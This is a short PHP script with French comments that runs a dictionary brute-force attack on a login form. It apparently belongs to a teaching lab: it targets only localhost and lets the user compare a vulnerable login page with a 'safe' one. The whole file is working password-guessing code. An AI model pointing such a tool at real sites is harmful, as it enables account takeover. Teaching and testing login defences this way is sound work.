<?php
// force_brute.php — attaque par dictionnaire contre le formulaire de connexion.
// À utiliser UNIQUEMENT sur le labo, sur votre poste (http://localhost:8000).
// Usage (depuis le dossier bibliotheque) :
//   php outils/force_brute.php <login> [page]
//   ex. : php outils/force_brute.php bob
//         php outils/force_brute.php bob connexion_safe.php

if ($argc < 2) {
    exit("Usage : php outils/force_brute.php <login> [page]\n");
}
$login = $argv[1];
$page = $argv[2] ?? 'connexion.php';
$cible = 'http://localhost:8000/' . $page;
$mots = file(__DIR__ . '/mots_de_passe_courants.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

echo 'Cible : ' . $cible . ' | login : ' . $login . ' | ' . count($mots) . ' mots à essayer' . PHP_EOL;
$debut = microtime(true);

foreach ($mots as $i => $mot) {
    $formulaire = http_build_query(['login' => $login, 'motdepasse' => $mot]);
    $contexte = stream_context_create(['http' => [
        'method'          => 'POST',
        'header'          => 'Content-Type: application/x-www-form-urlencoded',
        'content'         => $formulaire,
        'follow_location' => 0,     // on ne suit pas la redirection de succès
        'ignore_errors'   => true,
    ]]);
    $reponse = file_get_contents($cible, false, $contexte);

    // Échec = la page de connexion est renvoyée (elle contient le formulaire).
    // Succès = redirection vers mon_compte.php, sans formulaire.
    if ($reponse !== false && !str_contains($reponse, 'name="motdepasse"')) {
        printf('TROUVÉ : %s / %s après %d essais (%.1f s)' . PHP_EOL,
            $login, $mot, $i + 1, microtime(true) - $debut);
        exit(0);
    }
}

printf('Échec : aucun mot de passe trouvé après %d essais (%.1f s)' . PHP_EOL,
    count($mots), microtime(true) - $debut);
